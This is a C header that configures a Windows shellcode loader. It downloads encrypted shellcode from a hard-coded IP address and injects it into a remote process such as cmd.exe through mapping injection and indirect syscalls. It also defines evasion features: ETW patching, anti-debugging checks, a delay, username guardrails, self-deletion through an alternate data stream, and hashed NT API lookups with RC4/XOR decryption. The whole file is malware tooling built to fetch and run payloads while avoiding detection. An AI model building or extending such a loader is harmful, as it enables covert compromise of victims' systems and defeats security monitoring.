#pragma once
#include <windows.h>


/*----------------------------------------------
 Get the shellcode from webserver or local file
 if WEB is not defined local file is assumed and
 LOCAL_FILE path is used. Else the value for WEB
 will be used as a http port, for https SECURE
 is to be defined as well and its value will be
 used as https port. HOST and FILE will be used
 for the respective connection.
----------------------------------------------*/
#define WEB 80
//#define SECURE 443

#define HOST L"192.168.100.161"
#define REMOTE_FILE L"http-enc.bin"
#define LOCAL_FILE "C:\\Users\\nullb1t3\\Desktop\\http.bin"



/*-----------------------------------------
  Use direct or indirect syscalls
  if not defined direct are assumed
------------------------------------------*/
#define SYSCALL_INDIRECT


/*------------------------------------------
  Injection type to perform, if defined
  a mapping injection is done, if not
  classic is assumed
------------------------------------------*/
#define MAPPING_INJECTION


/*-----------------------------------------
  Define local or remote injection
  If remote, PID or PROC_NAME has to be
  defined as well if not local is assumed
-----------------------------------------*/
#define REMOTE_INJECT
#define PROC_NAME L"cmd.exe"
//#define PID 1744


/*------------------------------------------
 Anti-Debug constants
------------------------------------------*/
#define SELF_DELETE		//Delete the file on disk after execution
#define WAIT 1			//minutes
#define PATCH_ETW		//Attempt to patch ETW


/*-----------------------------------------
 Simple execution constraint guardrails,
 based on: Username, Userdomain, PCName
-----------------------------------------*/
#define GUARDRAILS "Username"
#define GUARDVALUE L"nullb1t3"


/*-----------------------------------------
  print DEBUG information or not
-----------------------------------------*/
#define DEBUG



/*------------------------------------------
  Hashes for functions that will be used
------------------------------------------*/
#define NtAllocateVirtualMemory_H 0x6E8AC28E
#define NtProtectVirtualMemory_H 0x1DA5BB2B
#define NtWriteVirtualMemory_H 0x319F525A
#define NtCreateThreadEx_H 0x08EC0B84A
#define NtOpenProcess_H 0x837FAFFE
#define NtWaitForSingleObject_H 0x6299AD3D
#define NtClose_H 0x369BD981
#define NtCreateSection_H 0x192C02CE
#define NtMapViewOfSection_H 0x91436663
#define NtUnmapViewOfSection_H 0xA5B9402
#define NtQuerySystemInformation_H 0x7B9816D6 
#define NtQueryInformationProcess_H 0x71D40BAA 
#define NtSetInformationFile_H 0xD5608A96
#define NtOpenFile_H 0xC9DFA25A
#define SystemFunction032_H 0x8CFD40A8			//RC4 encryption
#define EtwEventWrite_H 0xA6223D77				//ETW


/*-----------------------------------------
  Some default values
-----------------------------------------*/
#define HASH_SEED 8           //Hash function seed
#define RANGE 255             //Max range for syscall check
#define UP 32                 //Up check range
#define DOWN -32              //Down check range
#define NEW_STREAM L":legit"  //New Stream name for self-deletion


/*-----------------------------------------
  Define global variables
-----------------------------------------*/
extern NTCONF g_NtConfig;
extern SC_FUNC g_Fun;
extern ENV envVars;


/*-----------------------------------------
  Simple marcros
-----------------------------------------*/
#ifdef DEBUG
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#define WDEBUG_PRINT(...) wprintf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...) do {} while (0)
#define WDEBUG_PRINT(...) do {} while (0)
#endif



/*----------------------------------------------------
  Function prototypes definitions
-----------------------------------------------------*/
//Anti-debugging and evasion
#ifdef SELF_DELETE
BOOL DeleteSelf();
#endif
BOOL CheckResources();
BOOL CheckName();
BOOL IsDebugged();
BOOL GetEnv(OUT PENV envVars);
#ifdef GUARDRAILS
BOOL GuardRails();
#endif
#ifdef PATCH_ETW
BOOL PatchETW();
#endif
#ifdef WAIT
BOOL Delay(IN FLOAT minutes);
#endif


//Syscall related
BOOL NtInitConfig();
BOOL GetSyscl(IN DWORD dwSysHash, OUT PSYSCALL pSyscl);
BOOL InitSyscls();


//Shellcode injection related
#ifdef REMOTE_INJECT
BOOL Open(IN DWORD pid, OUT PHANDLE hProc);
#endif
#ifdef MAPPING_INJECTION
BOOL RunMap();
#elif !defined(MAPPING_INJECTION)
BOOL RunClassic();
#endif


//Fetch shellcode
#ifdef WEB
BOOL Download(IN LPCWSTR url, IN LPCWSTR file, OUT PCONTENT cnt);
#elif !defined(WEB)
BOOL ReadF(IN char* file_path, IN PDWORD file_size, IN PVOID* read_buffer);
#endif
BOOL GetSC(IN PCONTENT cnt);


//Hashing
UINT32 HashA(IN PCHAR String);
UINT32 HashW(IN PWCHAR String);


//Fetch function addresses without GetProcAddress
FARPROC GetAddr(IN HMODULE hModule, IN UINT32 ApiHash);


//Decryption related
BOOL rc4enc(PBYTE pKey, PBYTE pData, DWORD dwKey, DWORD sData);
VOID XoR(IN PBYTE pMessage, IN size_t sMsg_size, IN PBYTE key, IN size_t key_size);
char* GenKeyIP(IN char ips[][15], IN size_t count);
BOOL Dcrpt(IN PCONTENT cnt);


//Generic
DWORD GetProcesses(IN LPWSTR procName, IN PDWORD pid);


#ifdef SYSCALL_INDIRECT
extern VOID GetSSNI(DWORD SSN, PVOID jmpAddr);
extern InvokeI();

#elif !defined(SYSCALL_INDIRECT)
extern VOID GetSSND(WORD wSystemCall);
extern InvokeD();

#endif